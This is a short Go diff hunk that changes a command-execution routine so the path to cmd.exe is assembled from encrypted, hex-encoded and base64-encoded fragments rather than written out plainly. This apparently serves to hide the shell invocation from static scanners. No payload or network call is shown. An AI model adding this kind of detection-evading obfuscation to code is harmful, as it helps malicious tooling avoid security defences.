@@ -38,7 +38,7 @@ func Exec(command string) (bytes.Buffer,error){
 		return bytes.Buffer{},err
 	}
 
-	str1:="C:\\Windows"
+	str1:="C:\\W"+DecryptString(",+!*26")
 	str2,_:=hex.DecodeString("5c5c53797374656d33325c5c")
 	str3,_:=base64.StdEncoding.DecodeString("Y21kLmV4ZQ==")
 
